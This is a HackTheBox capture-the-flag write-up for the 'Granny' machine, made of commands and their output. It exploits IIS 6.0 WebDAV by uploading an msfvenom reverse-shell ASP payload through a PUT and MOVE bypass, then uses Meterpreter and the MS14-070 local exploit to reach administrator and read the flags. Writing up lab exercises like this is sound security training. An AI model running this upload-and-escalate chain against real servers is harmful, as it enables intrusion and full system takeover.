---
layout: page
title: Granny
description: Granny from HackTheBox.
img: 
importance: 4
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/granny/logo.png" title="HTB Granny Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://app.hackthebox.com/Granny">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Spending time with Granny this time.  But we are going to use a different exploit from Grandpa.  Privilege escalation is the same though.

Always start off with a nmap scan to determine the ports open.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/granny]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.15   
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-30 00:38 AEDT
Nmap scan report for 10.10.10.15
Host is up (0.020s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan: 
|   Server Date: Wed, 29 Jan 2025 13:38:25 GMT
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_http-title: Under Construction
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP (89%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (89%), Microsoft Windows Server 2003 SP2 (88%), Microsoft Windows Server 2008 Enterprise SP2 (87%), Microsoft Windows XP SP3 (87%), Microsoft Windows 2003 SP2 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   20.71 ms 10.10.16.1
2   20.73 ms 10.10.10.15

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.43 seconds
```
{% endraw %}

<br />
Create an asp payload with msfvenom.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/granny]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.12 LPORT=443 ExitFunc=thread -f asp -o shell.asp
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of asp file: 38252 bytes
Saved as: shell.asp
```
{% endraw %}

<br />
Try uploading the file to the webserver since the nmap said that it allowed for PUT requests.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/granny]
└─$ curl http://10.10.10.15/images --upload-file shell.asp
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>The page cannot be displayed</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=Windows-1252">
<STYLE type="text/css">
  BODY { font: 8pt/12pt verdana }
  H1 { font: 13pt/15pt verdana }
  H2 { font: 8pt/12pt verdana }
  A:link { color: red }
  A:visited { color: maroon }
</STYLE>
</HEAD><BODY><TABLE width=500 border=0 cellspacing=10><TR><TD>

<h1>The page cannot be displayed</h1>
The page you are looking for cannot be displayed because an invalid method (HTTP verb) was used to attempt access.
<hr>
<p>Please try the following:</p>
<ul>
<li>Contact the Web site administrator if you believe that this request should be allowed.</li>
<li>Make sure that the Web site address displayed in the address bar of your browser is spelled and formatted correctly. </li>
</ul>
<h2>HTTP Error 405 - The HTTP verb used to access this page is not allowed.<br>Internet Information Services (IIS)</h2>
<hr>
<p>Technical Information (for support personnel)</p>
<ul>
<li>Go to <a href="http://go.microsoft.com/fwlink/?linkid=8180">Microsoft Product Support Services</a> and perform a title search for the words <b>HTTP</b> and <b>405</b>.</li>
<li>Open <b>IIS Help</b>, which is accessible in IIS Manager (inetmgr),
 and search for topics titled <b>Setting Application Mappings</b>, <b>Securing Your Site with Web Site Permissions</b>, and <b>About Custom Error Messages</b>.</li>
</ul>

</TD></TR></TABLE></BODY></HTML>
```
{% endraw %}

<br />
Perhaps, there is an extension check preventing the upload.  Let's test this.  Change the extension to txt.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/granny]
└─$ cp shell.asp shell.txt
```
{% endraw %}

<br />
Start a netcat listener.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/granny]
└─$ sudo nc -nlvp 443                              
listening on [any] 443 ...
```
{% endraw %}

<br />
Try using cadever to upload the file to the webserver.  Then use the MOVE command to change the extension back to .asp.  Finally, use curl to execute the payload.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/granny]
└─$ cadaver http://10.10.10.15                     
dav:/> put shell.txt
Uploading shell.txt to `/shell.txt':
Progress: [=============================>] 100.0% of 38252 bytes succeeded.
dav:/> move shell.txt shell.asp
Moving `/shell.txt' to `/shell.asp': failed:
Could not parse response: XML parse error at line 1: Extra content at the end of the document

┌──(kali㉿kali)-[~/Documents/htb/granny]
└─$ curl http://10.10.10.15/shell.asp
```
{% endraw %}

<br />
Check the listener and catch the shell.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/granny]
└─$ sudo nc -nlvp 443                              
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.10.15] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>
```
{% endraw %}

<br />
Now...it was at this point that I was struggling with the compiled privelege escalation exploit.  It kept freezing my shell.  So, I decided to pivot to Meterpreter.  But I cut the struggle out for cleanliness.

{% raw %}
```sh
https://github.com/erwinwildenburg/Offsec/blob/master/Exploits/Windows/Privilege%20Escalation/MS14-070.c
```
{% endraw %}

<br />
Use msfvenom to generate a new payload in asp format and with the txt extension.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/granny]
└─$  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.12 LPORT=443 -f asp -o special.txt       
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of asp file: 38316 bytes
Saved as: special.txt
```
{% endraw %}

<br />
Start the a multi handler in msfconsole.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/granny]
└─$ msfconsole -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > show options

Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set LHOST 10.10.16.12
LHOST => 10.10.16.12
msf6 exploit(multi/handler) > set LHOST 10.10.16.12
LHOST => 10.10.16.12
msf6 exploit(multi/handler) > set lport 443
lport => 443
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) >
```
{% endraw %}

<br />
Use cadaver to PUT the file and MOVE the file exactly like we did before.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/granny]
└─$ cadaver http://10.10.10.15       
dav:/> put special.txt
Uploading special.txt to `/special.txt':
Progress: [=============================>] 100.0% of 38316 bytes succeeded.
dav:/> move special.txt special.asp
Moving `/special.txt' to `/special.asp': failed:
Could not parse response: XML parse error at line 1: Extra content at the end of the document

dav:/>
```
{% endraw %}

<br />
Curl the uploaded file.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/granny]
└─$ curl http://10.10.10.15/special.asp  
```
{% endraw %}

<br />
Check the multi/handler and catch the meterpreter session.

{% raw %}
```sh
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.10.16.12:443 
[*] Sending stage (177734 bytes) to 10.10.10.15
[*] Meterpreter session 1 opened (10.10.16.12:443 -> 10.10.10.15:1041) at 2025-01-30 02:04:26 +1100

meterpreter >
```
{% endraw %}

<br />
Run ps to get a list of the processes and migrate to a process that is owned by Networ Service user.

{% raw %}
```sh
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 320   272   csrss.exe
 324   1064  cidaemon.exe
 344   272   winlogon.exe
 392   344   services.exe
 404   344   lsass.exe
 584   392   svchost.exe
 672   392   svchost.exe
 732   392   svchost.exe
 748   1064  cidaemon.exe
 752   392   svchost.exe
 788   392   svchost.exe
 900   1064  cidaemon.exe
 924   392   spoolsv.exe
 952   392   msdtc.exe
 1064  392   cisvc.exe
 1112  392   svchost.exe
 1168  392   inetinfo.exe
 1204  392   svchost.exe
 1308  392   VGAuthService.exe
 1380  392   vmtoolsd.exe
 1388  1764  cmd.exe            x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe
 1480  392   svchost.exe
 1588  392   svchost.exe
 1712  1388  MS14-070.exe       x86   0        NT AUTHORITY\NETWORK SERVICE
 1764  2040  svchost.exe        x86   0                                      C:\WINDOWS\Temp\radF7B0F.tmp\svchost.exe
 1768  392   dllhost.exe
 1936  392   alg.exe
 1956  2976  MS14-070.exe       x86   0        NT AUTHORITY\NETWORK SERVICE
 1964  584   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 2040  1480  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 2108  1956  cmd.exe            x86   0                                      c:\windows\system32\cmd.exe
 2112  584   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 2252  1712  cmd.exe            x86   0                                      c:\windows\system32\cmd.exe
 2376  2040  svchost.exe        x86   0                                      C:\WINDOWS\Temp\radEE1F2.tmp\svchost.exe
 2404  584   wmiprvse.exe
 2964  2040  svchost.exe        x86   0                                      C:\WINDOWS\Temp\rad09BBC.tmp\svchost.exe
 2976  2964  cmd.exe            x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe

meterpreter > migrate 2112
[*] Migrating from 2376 to 2112...
[*] Migration completed successfully.
```
{% endraw %}

<br />
Background the session and search for the local_exploit_suggester.  Set the session with the session number from before.  Run the exploit.

{% raw %}
```sh
meterpreter > 
Background session 1? [y/N]  y
[-] Unknown command: y. Run the help command for more details.
msf6 exploit(multi/handler) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.

msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > exploit
[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 203 exploit checks are being tried...
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 42 / 42
[*] 10.10.10.15 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
```
{% endraw %}

<br />
Choose the ms14_070_tcpip_ioctl exploit.  Set the session to the meterpreter session that we backgrounded.  Set the LHOST option to the IP address of the tun0 interface.

{% raw %}
```sh
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms14_070_tcpip_ioctl
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > show options

Module options (exploit/windows/local/ms14_070_tcpip_ioctl):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Server 2003 SP2



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > set session 1
session => 1
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > set lhost tun0
lhost => 10.10.16.12
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > set lhost tun0
lhost => 10.10.16.12
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > exploit
[*] Started reverse TCP handler on 10.10.16.12:4444 
[*] Storing the shellcode in memory...
[*] Triggering the vulnerability...
[*] Checking privileges after exploitation...
[+] Exploitation successful!
[*] Sending stage (177734 bytes) to 10.10.10.15
[*] Meterpreter session 2 opened (10.10.16.12:4444 -> 10.10.10.15:1042) at 2025-01-30 02:14:08 +1100
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```sh
C:\Documents and Settings\Lakis\Desktop>type user.txt
type user.txt
<redacted>
C:\Documents and Settings\Lakis\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   IP Address. . . . . . . . . . . . : 10.10.10.15
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```sh
C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
<redacted>
C:\Documents and Settings\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   IP Address. . . . . . . . . . . . : 10.10.10.15
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
```
{% endraw %}

<br />
And with that, wrapped up Granny.  See you in the next one.